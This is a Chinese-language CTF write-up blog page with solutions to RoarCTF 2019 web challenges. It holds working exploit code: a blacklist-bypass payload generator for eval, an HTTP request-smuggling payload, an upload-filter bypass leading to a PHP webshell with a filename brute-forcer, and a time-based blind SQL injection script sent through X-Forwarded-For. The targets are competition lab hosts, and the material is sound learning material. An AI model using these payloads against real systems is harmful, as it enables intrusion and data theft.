$phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest
$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
//签名自动计算
$phar-&gt;stopBuffering();

?&gt;</code></pre>
<p>flag{a592b240-32ae-4381-a0ab-83790c98ca28}</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2019/10/19/巅峰极客/">http://blog.ccreater.top/2019/10/19/巅峰极客/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2019/10/19/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/" data-id="cka3ckr3r004xv4v02t4fcn4l" data-title="巅峰极客" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-roarctf2019" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/10/15/roarctf2019/" class="article-date">
  <time class="dt-published" datetime="2019-10-15T14:36:51.706Z" itemprop="datePublished">2019-10-15</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/10/15/roarctf2019/">roarctf2019</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="roarctf2019"><a href="#roarctf2019" class="headerlink" title="roarctf2019"></a>roarctf2019</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="easycalc"><a href="#easycalc" class="headerlink" title="easycalc"></a>easycalc</h3><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><pre><code class="php">
&lt;?php
error_reporting(0);
if(!isset($_GET[&#39;num&#39;])){
    show_source(__FILE__);
}else{
        $str = $_GET[&#39;num&#39;];
        $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];
        foreach ($blacklist as $blackitem) {
                if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $str)) {
                        die(&quot;what are you want to do?&quot;);
                }
        }
        eval(&#39;echo &#39;.$str.&#39;;&#39;);
}
?&gt;</code></pre>
<h4 id="解法一-肝就完事"><a href="#解法一-肝就完事" class="headerlink" title="解法一 肝就完事"></a>解法一 肝就完事</h4><p>强行绕过限制</p>
<p>关键:<code>((10000000000000).(0)){3}</code>=&gt;E</p>
<p>python脚本</p>
<pre><code class="python">arr={
    &quot;0&quot;:&#39;&#39;&#39;((0).(0)){0}&#39;&#39;&#39;,
    &quot;1&quot;:&#39;&#39;&#39;((1).(0)){0}&#39;&#39;&#39;,
    &quot;2&quot;:&#39;&#39;&#39;((2).(0)){0}&#39;&#39;&#39;,
    &quot;3&quot;:&#39;&#39;&#39;((3).(0)){0}&#39;&#39;&#39;,
    &quot;4&quot;:&#39;&#39;&#39;((4).(0)){0}&#39;&#39;&#39;,
    &quot;5&quot;:&#39;&#39;&#39;((5).(0)){0}&#39;&#39;&#39;,
    &quot;6&quot;:&#39;&#39;&#39;((6).(0)){0}&#39;&#39;&#39;,
    &quot;7&quot;:&#39;&#39;&#39;((7).(0)){0}&#39;&#39;&#39;,
    &quot;8&quot;:&#39;&#39;&#39;((8).(0)){0}&#39;&#39;&#39;,
    &quot;9&quot;:&#39;&#39;&#39;((9).(0)){0}&#39;&#39;&#39;,
    &quot;-&quot;: &quot;((-1).(0)){0}&quot;,
    &quot;.&quot; :&quot;((1.1).(0)){1}&quot;,
    &quot;E&quot;: &quot;((10000000000000000000).(1)){3}&quot;,
    &quot;p&quot;:&quot;((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1}))&quot;,
    &quot;$&quot;:&quot;((((-1).(0)){0})&amp;(((4).(0)){0}))&quot;,
    &quot;l&quot;:&quot;((((-1).(0)){0})&amp;(((4).(0)){0}))|(~((0).(0)){0})&amp;~((~((8).(0)){0})&amp;(~((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1}))))&quot;,
    &quot;H&quot;: &quot;(~((0).(0)){0})&amp;~((~((8).(0)){0})&amp;(~((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1}))))&quot;,
    &quot;Z&quot; : &quot;(~(((((-1).(0)){0})&amp;(((4).(0)){0}))))&amp;(~((~(((8).(0)){0}))&amp;((~(((2).(0)){0}))&amp;(~(((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1})))))))&quot;,
    &quot;v&quot; :&quot;(((2).(0)){0})|((~((1).(0)){0})&amp;((10000000000000000000).(1)){3})&quot;,
    &quot;D&quot; :&quot;(~((1).(0)){0})&amp;((10000000000000000000).(1)){3}&quot;,
    &quot;A&quot; :&quot;(~((2).(0)){0})&amp;(~((~((1).(0)){0})&amp;(~((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1})))))&quot;,
    &quot;P&quot; :&quot;(~((1.1).(0)){1})&amp;((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1}))&quot;,
    &quot;O&quot; :&quot;(~((0).(0)){0})&amp;(~((~((8).(0)){0})&amp;((~((2).(0)){0})&amp;(~((10000000000000000000).(1)){3}))))&quot;,
    &quot;S&quot; :&quot;(~((((-1).(0)){0})&amp;(((4).(0)){0})))&amp;(~((~((2).(0)){0})&amp;(~((10000000000000000000).(1)){3})))&quot;,
    &quot;U&quot; :&quot;(((10000000000000000000).(1)){3})|((~((((-1).(0)){0})&amp;(((4).(0)){0})))&amp;(~((~((1).(0)){0})&amp;(~((1.1).(0)){2}))))&quot;,
    &quot;_&quot; :&quot;((10000000000000000000).(1)){3}|(((~((((-1).(0)){0})&amp;(((4).(0)){0})))&amp;(~((~((1).(0)){0})&amp;(~((1.1).(0)){1})))))&quot;,
    &quot;T&quot; :&quot;(~(((1).(0)){0}&amp;(~((2).(0)){0})))&amp;(~((~((10000000000000000000).(1)){3})&amp;(~(((1).(0)){0}&amp;(~((1.1).(0)){1})))))&quot;,
    &quot;I&quot; :&quot;(~(((0).(0)){0}))&amp;(~((~((8).(0)){0})&amp;((~((1).(0)){0})&amp;(~((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1}))))))&quot;,
    &quot;N&quot; :&quot;(~((0).(0)){0})&amp;(~((~((8).(0)){0})&amp;((~(((2).(0)){0}))&amp;(~((~((1).(0)){0})&amp;((10000000000000000000).(1)){3})))))&quot;,
    &quot;f&quot; :&quot;((((-1).(0)){0})&amp;(((4).(0)){0}))|((~(((4).(0)){0}))&amp;(~((~(((2).(0)){0}))&amp;(~((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1}))))))&quot;,
    &quot;B&quot; :&quot;(~(((4).(0)){0}))&amp;(~((~(((2).(0)){0}))&amp;(~((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1})))))&quot;,
    &quot;r&quot; :&quot;(~((~(((2).(0)){0}))&amp;(~((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1})))))&quot;,
    &quot;[&quot; :&quot;(~(((((-1).(0)){0})&amp;(((4).(0)){0}))))&amp;(~((~((8).(0)){0})&amp;((~(((2).(0)){0}))&amp;(~(((10000000000000000000).(1)){3})))))&quot;,
    &quot;]&quot; :&quot;(((10000000000000000000).(1)){3})|((((8).(0)){0})&amp;(~(((((-1).(0)){0})&amp;(((4).(0)){0})))))&quot;,
    &quot;C&quot;:&quot;(~(((4).(0)){0}))&amp;(~((~(((2).(0)){0}))&amp;(~(((10000000000000000000).(1)){3}))))&quot;,
    &quot;M&quot;:&quot;(~(((0).(0)){0}))&amp;(~((~(((8).(0)){0}))&amp;(~(((10000000000000000000).(1)){3}))))&quot;,
    &quot;\\&quot;:&quot;(~(((((1).(0)){0}))&amp;(~(((2).(0)){0})))&amp;~((~(((10000000000000000000).(1)){3}))&amp;~((((8).(0)){0})&amp;(~(((((-1).(0)){0})&amp;(((4).(0)){0})))))))&quot;,
    &quot;/&quot;:&quot;((((1.1).(0)){1})|(((-1).(0)){0}))&quot;,
    &quot;G&quot;:&quot;(~(((8).(0)){0}))&amp;(~((~(((2).(0)){0}))&amp;(~(((10000000000000000000).(1)){3}))))&quot;,
    &quot;g&quot;:&quot;(((10000000000000000000).(1)){3})|((((2).(0)){0})&amp;(((1.1).(0)){1}))&quot;,
    &quot;a&quot;:&quot;((((1).(0)){0})&amp;((~((2).(0)){0})))|((((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1})))&amp;(~((((1).(0)){0})&amp;(~(((1.1).(0)){1})))))&quot;
    }
s=&quot;scandir&quot;
def topayload(s):
    result=&quot;&quot;
    for i in s:
        if(i in arr):
            result+=(&quot;(&quot;+arr[i]+&quot;)&quot;+&quot;.&quot;)
            continue
        if(i.upper() in arr):
            result+=(&quot;(&quot;+arr[i.upper()]+&quot;)&quot;+&quot;.&quot;)
            continue
        if(i.lower() in arr):
            result+=(&quot;(&quot;+arr[i.lower()]+&quot;)&quot;+&quot;.&quot;)
    return result[:-1]
def tomethod(meth,para,c=True):
    if c:
        return &quot;(&quot;+topayload(meth)+&quot;)(&quot;+topayload(para)+&quot;)&quot;
    else :
        return &quot;(&quot;+topayload(meth)+&quot;)(&quot;+(para)+&quot;)&quot;
# print(tomethod(&quot;var_dump&quot;,tomethod(&quot;scandir&quot;,&quot;/&quot;),False))
print(tomethod(&quot;var_dump&quot;,tomethod(&quot;file&quot;,&quot;/f1agg&quot;),False))
# print(tomethod(&quot;file_get_contents&quot;,&quot;/f1agg&quot;))
</code></pre>
<h4 id="解法二-HTTP走私"><a href="#解法二-HTTP走私" class="headerlink" title="解法二 HTTP走私"></a>解法二 HTTP走私</h4><p>http走私请看:<a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">https://paper.seebug.org/1048/</a></p>
<p>这题php禁用了<code>$blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;反引号&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];</code></p>
<p>apache再禁用了字母和不可打印字符</p>
<p>后来看别人的wp知道了,虽然服务器返回400,但是还会将请求转发给后端,标准的http走私</p>
<p><img src="https://i.loli.net/2019/10/18/9YgzckxODPiNe6C.png" alt="image.png"></p>
<p>真几把神奇，刚看到http走私的时候我还以为是前后端对content-type的解析不同</p>
<p>结合getallheads来绕过php字符限制</p>
<p>最后payload:</p>
<pre><code>POST /calc.php?num=eval(end(getallheaders())); HTTP/1.1
Host: node3.buuoj.cn:28023
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36
Referer: http://node3.buuoj.cn:28023/
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 422
Content-Length: 0
A: var_dump(file_get_contents(&quot;/f1agg&quot;));

</code></pre><h4 id="解法三-利用php字符串解析特性绕过apache-waf"><a href="#解法三-利用php字符串解析特性绕过apache-waf" class="headerlink" title="解法三 利用php字符串解析特性绕过apache waf"></a>解法三 利用php字符串解析特性绕过apache waf</h4><p>php字符串解析特性</p>
<p><img src="https://image.3001.net/images/20190904/1567560438_5d6f12f680afe.png!small" alt=""></p>
<p><img src="https://image.3001.net/images/20190904/1567560448_5d6f13004035f.png!small" alt=""></p>
<p>当我们发送这样一个请求是:<code>?%20num=123</code></p>
<p>apache的检查规则只能匹配到num,而这个请求在php却会被解析为$_GET[‘num’]最后成功绕过apache的waf</p>
<h3 id="Easy-Java"><a href="#Easy-Java" class="headerlink" title="Easy Java"></a>Easy Java</h3><p>扫目录发现一个Download,去登入界面查找一下download,发现<code>Download?filename=help.docx</code></p>
<p>可是无论下什么也不行,看了别人的wp发现post就可以233333</p>
<p>接下来就简单了,因为这是一个tomcat的网站</p>
<p>贴一个tomcat的结构图</p>
<p><img src="https://i.loli.net/2019/09/01/LduWtSfIh8bDA7Z.png" alt=""></p>
<p>先去查看一下WEB-INF/web.xml</p>
<p>发现</p>
<pre><code class="xml">    &lt;servlet&gt;
        &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;
        &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;
    &lt;/servlet&gt;</code></pre>
<p>于是去WEB-INF/classes/com/wm/ctf/FlagController.class</p>
<p>查看,发现一个base64编码的字符串</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g82oi6jxybj31240l2dj8.jpg" alt="image.png"></p>
<h3 id="simple-upload"><a href="#simple-upload" class="headerlink" title="simple_upload"></a>simple_upload</h3><h4 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h4><pre><code class="php">&lt;?php
namespace Home\Controller;

use Think\Controller;

class IndexController extends Controller
{
    public function index()
    {
        show_source(__FILE__);
    }
    public function upload()
    {
        $uploadFile = $_FILES[&#39;file&#39;] ;
        $_FILES[&#39;file&#39;][&#39;name&#39;]
        if (strstr(strtolower($uploadFile[&#39;name&#39;]), &quot;.php&quot;) ) {
            return false;
        }

        $upload = new \Think\Upload();// 实例化上传类
        $upload-&gt;maxSize  = 4096 ;// 设置附件上传大小
        $upload-&gt;allowExts  = array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);// 设置附件上传类型
        $upload-&gt;rootPath = &#39;./Public/Uploads/&#39;;// 设置附件上传目录
        $upload-&gt;savePath = &#39;&#39;;// 设置附件上传子目录
        $info = $upload-&gt;upload() ;
        if(!$info) {// 上传错误提示错误信息
          $this-&gt;error($upload-&gt;getError());
          return;
        }else{// 上传成功 获取上传文件信息
          $url = __ROOT__.substr($upload-&gt;rootPath,1).$info[&#39;file&#39;][&#39;savepath&#39;].$info[&#39;file&#39;][&#39;savename&#39;] ;
          echo json_encode(array(&quot;url&quot;=&gt;$url,&quot;success&quot;=&gt;1));
        }
    }
}</code></pre>
<h4 id="解法一-thinkphp漏洞"><a href="#解法一-thinkphp漏洞" class="headerlink" title="解法一 thinkphp漏洞"></a>解法一 thinkphp漏洞</h4><p>利用<code>Think\Controller,\Think\Upload()</code> 等关键字查询到该thinkphp版本大致在3.2.x,这里我去找了3.2.3的源码</p>
<p>阅读文件上传部分代码发现</p>
<pre><code class="php">&lt;?php
    ....
    public function upload($files = &#39;&#39;)
    {
        if (&#39;&#39; === $files) {
            $files = $_FILES;
        }
        .....

        $files = $this-&gt;dealFiles($files);
        foreach ($files as $key =&gt; $file) {
            $file[&#39;name&#39;] = strip_tags($file[&#39;name&#39;]);
            if (!isset($file[&#39;key&#39;])) {
                $file[&#39;key&#39;] = $key;
            }
        ....
    }
    ....
    ?&gt;</code></pre>
<p>这里注意到有个strip_tags,查询文档<code>从字符串中去除 HTML 和 PHP 标记</code></p>
<p>ok,成功找到绕过后缀名限制的方法</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g82rhln3m6j31240l2whe.jpg" alt="image.png"></p>
<p>成功getflag美滋滋</p>
<h4 id="解法二-上传多个文件绕过后缀名检测"><a href="#解法二-上传多个文件绕过后缀名检测" class="headerlink" title="解法二  上传多个文件绕过后缀名检测"></a>解法二  上传多个文件绕过后缀名检测</h4><p>大佬们太强了/fad/fad</p>
<pre><code class="php"> $uploadFile = $_FILES[&#39;file&#39;] ;
if (strstr(strtolower($uploadFile[&#39;name&#39;]), &quot;.php&quot;) ) {
            return false;
        }</code></pre>
<p>如果上传多个文件, $uploadFile内包含多个文件,<code>strstr(strtolower($uploadFile[&#39;name&#39;]), &quot;.php&quot;)</code>自然也就无效了,接下来就是获取文件名,就可以getshell,因为thinkphp文件名是递增的,所以也就很容易获取到想要的文件了</p>
<pre><code class="pyhon">import requests
url=&quot;http://aba32602-5c6b-4a9f-bfa6-bbf2ca660f7e.node3.buuoj.cn/Public/Uploads/2019-10-18/&quot;
i=(int(&quot;5da9dd208595a&quot;,16)+1)
while True:
    print(url+hex(i)[2:]+&quot;.php&quot;)
    res=requests.get(url+hex(i)[2:]+&quot;.php&quot;)
    print(res.status_code)
    if(res.status_code==200):
        print(url+hex(i)[2:]+&quot;.php&quot;)
        break

    i+=1</code></pre>
<p>虽然说可以爆出来，不过也要跑好一会</p>
<h3 id="Online-Proxy"><a href="#Online-Proxy" class="headerlink" title="Online Proxy"></a>Online Proxy</h3><p>利用libcurl和paras_url的差异来判断</p>
<p><a href="http://node3.buuoj.cn:28001/?url=http://user@39.108.164.219@ccccccccccccc.com" target="_blank" rel="noopener">http://node3.buuoj.cn:28001/?url=http://user@39.108.164.219@ccccccccccccc.com</a></p>
<p>200</p>
<p><a href="http://node3.buuoj.cn:28001/?url=http://user@ccccccccccccc.com@39.108.164.219" target="_blank" rel="noopener">http://node3.buuoj.cn:28001/?url=http://user@ccccccccccccc.com@39.108.164.219</a></p>
<p>504</p>
<p>而访问<a href="http://node3.buuoj.cn:28001/?url=http://39.108.164.219" target="_blank" rel="noopener">http://node3.buuoj.cn:28001/?url=http://39.108.164.219</a></p>
<p>也是504,所以有可能使用file_get_contents来访问url</p>
<p>刚开始一直盯着url,后面看到收集信息,99%是sql注入的题</p>
<p>就是不知道要收集什么信息</p>
<pre><code class="html">&lt;!-- Debug Info: 
 Duration: 0.20821499824524 s 
 Current Ip: 127.0.0.1  --&gt;
&lt;!-- Debug Info: 
 Duration: 0.34751987457275 s 
 Current Ip: &#39;# 
Last Ip: &#39; --&gt;</code></pre>
<p>这题虽然是sql注入,但比较操蛋的是,sql注入的是last ip</p>
<p>因为这个加上自己的懒惰让我搞了8-9个小时,因小失大/fad</p>
<p>题目提示会收集信息,能收集的大概也就是ip地址</p>
<p>于是找到x-forward-for http注入,虽然说的轻松,但是我完全找了好久还加上了wp的帮助</p>
<p>emmmm直接扔脚本</p>
<pre><code class="python">import requests
import string
import random
import time
import sys
def rand_str(length=8):
    return &#39;&#39;.join(random.sample(string.ascii_letters + string.digits, length))

ii=0
def curl_url(sql):
    global ii
    headers={
        &quot;Host&quot;:&quot;node3.buuoj.cn:28645&quot;,
        &quot;Cache-Control&quot;:&quot;max-age=0&quot;,
        &quot;X-Forwarded-For&quot;:&quot;&quot;,
        &quot;Upgrade-Insecure-Requests&quot;:&quot;1&quot;,
        &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36&quot;,
        &quot;Accept&quot;:&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;,
        &quot;Accept-Language&quot;:&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;,
        &quot;Connection&quot;:&quot;close&quot;
    }
    cookies={&quot;track_uuid&quot;:&quot;1e3b12a4-60f8-4778-a0b7-%s;&quot; % rand_str()}
    #1&#39;+if(ascii(substr(hex((select GROUP_CONCAT(table_name) FROM information_schema.tables WHERE TABLE_SCHEMA=database())),1,1))&gt;0,sleep(10),0)+&#39;13
    # headers[&quot;X-Forwarded-For&quot;]=&quot;1&#39;+if(&quot;+sql+&quot;,sleep(10),0)+&#39;&quot;+str(ii)
    url=&quot;http://node3.buuoj.cn:28841?url=http://127.0.0.1&quot;
    #清空
    while True:
        headers[&quot;X-Forwarded-For&quot;]=&quot;clear&quot;+str(ii)
        try:
            res= requests.get(url,headers=headers,cookies=cookies,timeout=3)
        except :
            pass
        if &quot;Last Ip: clear&quot; in res.text:
            break
        ii+=1
    #压入
    headers[&quot;X-Forwarded-For&quot;]=&quot;1&#39;+if(&quot;+sql+&quot;,sleep(10),0)+&#39;&quot;+str(ii)
    res= requests.get(url,headers=headers,cookies=cookies,timeout=3)
    #执行
    while True:
        ii+=1
        headers[&quot;X-Forwarded-For&quot;]=&quot;clear&quot;+str(ii)

        try:
            res= requests.get(url,headers=headers,cookies=cookies,timeout=3)
        except :
            return 1

        if sql not in res.text:
            curl_url(sql)
        return 0


#database information_schema,test,mysql,ctftraining,performance_schema,F4l9_D4t4B45e,ctf
#table  F4l9_t4b1e
#column F4l9_C01uMn
#flag flag{G1zj1n_W4nt5_4_91r_Fr1end},flag{03a6ead5-ffec-4bc0-bffd-92efd5a81e11}
sql=&quot;(substr(hex((select GROUP_CONCAT(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e )),INDEX,1))=&#39;GUESS&#39;&quot;
result=&quot;696e666f726d6174696f6e5f736368656d612c746573742c6d7973716c2c637466747261696e696e672c706572666F726D616E63655F736368656D612c46346c395&quot;
result=&quot;666c61677b47317a6a316e5f57346e74355f345f393172115&quot;
index=len(result)

while True:
    index+=1
    for i in range(16):
        ii+=1
        tmp=sql.replace(&quot;INDEX&quot;,str(index)).replace(&quot;GUESS&quot;,hex(i)[2:])

        if curl_url(tmp):
            result+=hex(i)[2:]
            print(result)
            break
        print(&quot;第&quot;+str(index)+&quot;不是&quot;+hex(i)[2:])</code></pre>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2019/10/15/roarctf2019/">http://blog.ccreater.top/2019/10/15/roarctf2019/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2019/10/15/roarctf2019/" data-id="cka3ckr39003jv4v0gtuqfa1u" data-title="roarctf2019" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/5/">&lt;- Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 10px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 16.67px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 15px;">web</a> <a href="/tags/wp/" style="font-size: 18.33px;">wp</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 11.67px;">域渗透</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 13.33px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 11.67px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 11.67px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
